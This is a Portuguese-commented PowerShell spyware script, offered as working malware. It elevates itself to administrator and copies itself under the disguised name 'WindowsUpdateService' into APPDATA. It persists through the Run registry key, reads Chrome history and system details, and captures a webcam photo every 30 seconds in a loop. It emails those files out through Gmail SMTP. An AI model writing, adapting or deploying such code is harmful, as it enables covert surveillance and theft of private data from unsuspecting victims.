Write-Host $asciiArt -ForegroundColor Red
# ==================== CONFIGURAÇÕES ====================
$taskName         = "WindowsUpdateService"
$fakeName         = "WindowsUpdateService.ps1"
$installPath      = "$env:APPDATA\Microsoft\Windows\$fakeName"

$reportPath       = "$env:TEMP\report.txt"
$keylogPath       = "$env:TEMP\keylog.txt"
$reportPathChrome = "$env:TEMP\Chrome_History_Report.txt"
$reportPathLogin  = "$env:TEMP\Login_Report.txt"

$asciiHackText    = "=== HACKED ==="
$ffmpegDir        = "$env:APPDATA\Microsoft\Windows\ffmpeg"
$ffmpeg           = Join-Path $ffmpegDir "ffmpeg.exe"

$extractPath      = "$env:APPDATA\Microsoft\Windows\sqlite"
$sqlitePath       = Join-Path $extractPath "sqlite3.exe"
$historyDB        = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
$tempCopy         = "$env:TEMP\history_temp.db"

# ==================== AUTOELEVAÇÃO ====================
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# ==================== PERSISTÊNCIA ====================
if ($MyInvocation.MyCommand.Definition -ne $installPath) {
    Copy-Item -Path $MyInvocation.MyCommand.Definition -Destination $installPath -Force
    $runCmd = "powershell -NoExit -ExecutionPolicy Bypass -File `"$installPath`""
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $taskName -Value $runCmd
}

# ==================== INSTALAR SQLITE ====================
if (-not (Test-Path $extractPath)) {
    New-Item -ItemType Directory -Path $extractPath -Force | Out-Null
}

if (-not (Test-Path $sqlitePath)) {
    $downloadUrl = "https://www.sqlite.org/2025/sqlite-tools-win-x64-3500200.zip"
    $destZip = "$env:TEMP\sqlite.zip"

    Invoke-WebRequest -Uri $downloadUrl -OutFile $destZip -UseBasicParsing
    Expand-Archive -Path $destZip -DestinationPath $extractPath -Force

    $sqliteExe = Get-ChildItem -Path $extractPath -Recurse -Filter sqlite3.exe | Select-Object -First 1
    if ($sqliteExe) {
        Move-Item -Path $sqliteExe.FullName -Destination $sqlitePath -Force
    } else {
        exit
    }
}

# ==================== INSTALAR FFMPEG ====================
if (-not (Test-Path $ffmpegDir)) {
    New-Item -ItemType Directory -Path $ffmpegDir -Force | Out-Null
}

if (-not (Test-Path $ffmpeg)) {
    $ffmpegUrl = "https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip"
    $ffmpegZip = "$env:TEMP\ffmpeg.zip"

    Invoke-WebRequest -Uri $ffmpegUrl -OutFile $ffmpegZip -UseBasicParsing
    Expand-Archive -Path $ffmpegZip -DestinationPath $ffmpegDir -Force

    $ffmpegFound = Get-ChildItem -Path $ffmpegDir -Recurse -Filter "ffmpeg.exe" | Select-Object -First 1
    if ($ffmpegFound) {
        Move-Item -Path $ffmpegFound.FullName -Destination $ffmpeg -Force
    } else {
        exit
    }
}

# ==================== WEBCAM ====================
function Get-WebcamDevice {
    if (-Not (Test-Path $ffmpeg)) {
        return $null
    }
    $output = & $ffmpeg -list_devices true -f dshow -i dummy 2>&1
    foreach ($line in $output) {
        if ($line -match '"([^\"]+)" \(video\)') {
            return $matches[1]
        }
    }
    return $null
}

# ==================== RELATÓRIOS ====================
function Generate-Reports {
    "=== LOGIN REPORT ===" | Out-File $reportPath
    "Data: $(Get-Date)" | Out-File -Append $reportPath
    "Usuário: $env:USERNAME" | Out-File -Append $reportPath
    "Máquina: $env:COMPUTERNAME" | Out-File -Append $reportPath
    "`n[Startup Folder - User]" | Out-File -Append $reportPath
    Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" | Select Name, FullName | Out-String | Out-File -Append $reportPath
    "`n[Registry - HKCU Run]" | Out-File -Append $reportPath
    Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" | Out-String | Out-File -Append $reportPath

    if ((Test-Path $sqlitePath) -and (Test-Path $historyDB)) {
        Copy-Item $historyDB -Destination $tempCopy -Force
        $query = "SELECT url, title, datetime(last_visit_time/1000000-11644473600,'unixepoch') as visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10;"
        $results = & $sqlitePath $tempCopy $query
        "==CHROME HISTORY==" | Out-File $reportPathChrome
        $results | Out-File -Append $reportPathChrome
    } else {
        "SQLite ou histórico não disponível." | Out-File $reportPathChrome
    }
}
#********************
$asciiArt = @"
⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠔⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡒⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⡖⠁⣸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣧⠈⢳⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡟⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⢹⣆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⡿⠀⠀⢠⡗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⢻⡆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣾⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠈⣯⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢰⡞⠀⠀⠀⠈⢻⡀⠀⠀⠀⠀⠀⣀⣤⡴⠶⠞⠛⠛⠛⠛⠛⠻⠶⢶⣤⣀⠀⠀⠀⠀⠀⠀⣿⠃⠀⠀⠀⢸⡇⠀⠀⠀⠀
⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠘⣷⡀⠀⣀⡴⢛⡉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⡛⢦⣄⠀⠀⣼⠇⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀
⢰⡀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠈⠳⣾⣭⢤⣄⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⢀⡤⣈⣷⠞⠃⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⡄
⢸⢷⡀⠀⠈⣿⠀⠀⠀⠀⠀⠀⠀⠀⠈⢉⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡍⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠃⠀⠀⡜⡇
⠈⣇⠱⣄⠀⠸⣧⠀⠀⠀⠀⠀⠄⣀⣀⣼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⣀⣀⠠⠀⠀⠀⠀⠀⣰⠇⠀⢀⠞⢰⠃
⠀⢿⠀⠈⢦⡀⠘⢷⣄⠀⢀⣀⡀⣀⡼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣀⣀⡀⢀⠀⣠⡼⠋⢀⡴⠁⠀⣹⠀
⠀⠸⡄⠑⡀⠉⠢⣀⣿⠛⠒⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠒⠋⢻⣀⠴⠋⢀⠄⢀⡇⠀
⠀⠀⢣⠀⠈⠲⢄⣸⡇⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢔⠀⠀⠀⠘⣏⣀⠔⠁⠂⡸⠀⠀
⠀⠀⠘⡄⠀⠀⠀⠉⢻⡄⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠋⠀⠀⠀⢠⠇⠀⠀
⠀⠀⠀⠙⢶⠀⠀⠀⢀⡿⠀⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠤⠀⢾⡀⠀⠀⠀⡴⠎⠀⠀⠀
⠀⠀⠀⠀⠀⠙⢦⡀⣸⠇⠀⠀⠀⠈⠹⡑⠲⠤⣀⡀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⣀⡤⠖⢊⠍⠃⠀⠀⠀⠘⣧⢀⡤⠊⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⣿⠀⠀⠀⠀⠀⠀⠈⠒⢤⠤⠙⠗⠦⠼⠀⠀⠀⠠⠴⠺⠟⠤⡤⠔⠁⠀⠀⠀⠀⠀⠀⢸⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⣄⠀⠀⡑⢯⡁⠀⠀⠀⠀⠀⠇⠀⠀⠀⠰⠀⠀⠀⠀⠀⢈⡩⢋⠀⠀⢠⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡆⠀⠈⠀⠻⢦⠀⠀⠀⡰⠀⠀⠀⠀⠀⢇⠀⠀⠀⡠⡛⠀⠁⠀⢰⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣇⠀⠀⠀⠀⢡⠑⠤⣀⠈⢢⠀⠀⠀⡴⠃⣀⠤⠊⡄⠀⠀⠀⠀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢶⣄⠀⠀⠀⠳⠀⢀⠉⠙⢳⠀⡜⠉⠁⡀⠀⠼⠀⠀⠀⣠⡴⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⠀⠘⣆⠐⠐⠌⠂⠚⠀⠡⠊⠀⢠⠃⠀⣠⠞⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠠⠈⠢⣄⡀⠀⠀⠀⢀⣀⠴⠃⠀⣴⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⡁⠐⠀⠈⠉⠁⠈⠁⠀⠒⢀⡴⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣦⠀⠀⠀⠀⠀⠀⠀⣰⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢧⣄⣀⣀⣀⣀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"@
$utf8NoBomEncoding = New-Object System.Text.UTF8Encoding($false)
[System.IO.File]::WriteAllText($reportPath, $asciiArt, $utf8NoBomEncoding)
# ==================== EMAIL ====================
function Enviar-EmailComAnexos {
    param ([string[]]$Anexos)
    $emailFile = "$PSScriptRoot\email.secure"
    $passwordFile = "$PSScriptRoot\appPassword.secure"
    if ((Test-Path $emailFile) -and (Test-Path $passwordFile)) {
        function ConvertFrom-SecureStringToString([System.Security.SecureString]$s) {
            [System.Runtime.InteropServices.Marshal]::PtrToStringAuto(
                [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($s)
            )
        }
        $from = ConvertFrom-SecureStringToString (Get-Content $emailFile | ConvertTo-SecureString)
        $pass = Get-Content $passwordFile | ConvertTo-SecureString
        $cred = New-Object System.Management.Automation.PSCredential($from, $pass)

        try {
            Send-MailMessage -From $from -To $from -Subject "Relatórios + Webcam" -Body "Segue Chrome, Login e Webcam." -SmtpServer "smtp.gmail.com" -Port 587 -UseSsl -Credential $cred -Attachments $Anexos
        } catch {}
    }
}

# ==================== EXECUÇÃO PRINCIPAL ====================
function Main {
    Generate-Reports
    $device = Get-WebcamDevice
    if ($null -eq $device) { return }

    while ($true) {
        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        $photo = "$env:TEMP\webcam_$timestamp.jpg"
        & $ffmpeg -f dshow -rtbufsize 200M -i "video=$device" -frames:v 1 $photo
        Start-Sleep -Milliseconds 500

        if (Test-Path $photo) {
            $anexos = @($reportPathChrome, $reportPathLogin, $photo)
            Enviar-EmailComAnexos -Anexos $anexos
        }

        Start-Sleep -Seconds 30
    }
}

# ============== PROTEÇÃO DE ERROS E EXECUÇÃO ==============
try {
    Main
} catch {
    "[!] ERRO: $($_.Exception.Message)" | Out-File -Append "$env:TEMP\debug_script.log"
    pause
}
